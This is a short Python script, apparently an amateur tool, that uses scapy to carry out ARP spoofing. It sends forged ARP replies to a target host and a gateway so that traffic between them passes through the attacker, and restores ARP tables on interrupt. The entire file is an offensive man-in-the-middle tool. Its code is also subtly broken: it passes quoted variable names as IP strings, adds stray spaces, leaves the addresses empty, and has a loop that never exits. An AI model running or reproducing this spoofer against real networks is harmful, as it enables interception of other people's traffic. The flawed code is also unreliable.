from scapy.all import *
import time

def get_mac(ip):
    arp_request = ARP(pdst = ip)
    broadcast = Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout = 1, verbose = False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    package = ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    send(package, verbose = False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    package = ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    send(package, count = 4, verbose = False)


# ------------------------------------------------------------------------- #

target_ip = ""
gateway = ""

sent_packages = 0

while True:
    try:
        spoof("target_ip", "gateway")
        spoof("gateway", "target_ip")

        sent_packages += 2
        print(str(sent_packages) + "Package sent", end = "")
        time.sleep(2)
    except KeyboardInterrupt:
        print("Closing ARP spoofer...")
        restore("target_ip ", "gateway")
        restore("gateway ", "target_ip")